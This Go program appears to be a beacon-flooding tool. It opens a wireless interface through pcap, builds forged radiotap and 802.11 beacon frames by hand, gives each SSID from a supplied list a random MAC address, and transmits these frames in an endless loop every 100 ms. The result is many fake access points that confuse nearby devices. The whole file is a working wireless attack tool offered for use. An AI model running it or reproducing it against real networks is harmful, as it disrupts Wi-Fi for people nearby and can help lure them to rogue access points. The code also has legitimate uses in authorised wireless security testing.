package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"time"

	"github.com/beacon-flooding/utils"
	"github.com/google/gopacket/pcap"
)

type SimpleRadioTap struct {
	HeaderRevision   uint8
	HeaderPad        uint8
	HeaderLength     uint16
	Present1         uint32
	Present2         uint32
	Flags            uint8
	DataRate         uint8
	ChannelFrequency uint16
	ChannelFlags     uint16
	AnthenaSignal    uint16
	RxFlags          uint16
	AnthenaSignalDup uint16
}

type SimpleDot11 struct {
	Type               uint16
	Duration           uint16
	DestinationAddress [6]byte
	SourceAddress      [6]byte
	BssId              [6]byte
	FragSeqNum         uint16
}

type SimpleDot11Beacon struct {
	Timestamp uint64
	Interval  uint16
	Flags     uint16
}

type SimpleDot11Info struct {
	Number  uint8
	Length  uint8
	Content string
}

func main() {
	if len(os.Args) != 3 {
		fmt.Printf("Input args count not match %d of 2\n", len(os.Args)-1)
		os.Exit(1)
	}

	ifSelect := os.Args[1]
	handler, err := pcap.OpenLive(ifSelect, 2048, true, pcap.BlockForever)
	utils.PanicError(err)

	ssids, err := utils.ReadSsidList(os.Args[2])
	utils.PanicError(err)

	// buf := gopacket.NewSerializeBuffer()
	// opts := gopacket.SerializeOptions{}
	// gopacket.SerializeLayers(buf, opts, a, b, c)

	radioTap := SimpleRadioTap{
		HeaderRevision:   0x00,
		HeaderPad:        0x00,
		HeaderLength:     0x0018,
		Present1:         0xa000402e,
		Present2:         0x00000820,
		Flags:            0x00,
		DataRate:         0x02,
		ChannelFrequency: 0x096c,
		ChannelFlags:     0x00a0,
		AnthenaSignal:    0x00ab,
		RxFlags:          0x0000,
		AnthenaSignalDup: 0x00ab,
	}

	dot11 := SimpleDot11{
		Type:               0x0080,
		Duration:           0x0000,
		DestinationAddress: [6]byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		SourceAddress:      [6]byte{0x58, 0x86, 0x94, 0xf3, 0x94, 0xdb},
		BssId:              [6]byte{0x58, 0x86, 0x94, 0xf3, 0x94, 0xdb},
		FragSeqNum:         0x0000,
	}

	beacon := SimpleDot11Beacon{
		Timestamp: uint64(time.Now().Unix()),
		Interval:  0x0064,
		Flags:     0x1c31,
	}

	ssid := SimpleDot11Info{
		Number: 0,
		Length: 0,
	}

	rates := []byte{0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24}
	channel := []byte{0x03, 0x01, 0x0b}

	macs := make(map[int][6]byte)
	for i := 0; i < len(ssids); i++ {
		macs[i] = utils.GenerateRandMac()
		fmt.Printf("Random mac generated for \"%s\" : %s\n", ssids[i], utils.BytesToMac(macs[i]))
	}

	go utils.ExecutingBar()

	for {
		dot11.FragSeqNum += 16

		// dot11.SourceAddress = [6]byte{0x58, 0x86, 0x94, 0xf3, 0x94, 0xdb}
		// dot11.BssId = [6]byte{0x58, 0x86, 0x94, 0xf3, 0x94, 0xdb}

		for i, s := range ssids {
			buf := new(bytes.Buffer)

			dot11.SourceAddress = macs[i]
			dot11.BssId = macs[i]

			binary.Write(buf, binary.LittleEndian, radioTap)
			binary.Write(buf, binary.LittleEndian, dot11)
			binary.Write(buf, binary.LittleEndian, beacon)

			binary.Write(buf, binary.LittleEndian, ssid.Number)
			binary.Write(buf, binary.LittleEndian, uint8(len(s)))
			buf.WriteString(s)

			buf.Write(rates)
			buf.Write(channel)

			err = handler.WritePacketData(buf.Bytes())
			utils.PanicError(err)
		}
		time.Sleep(time.Millisecond * 100)
	}
}
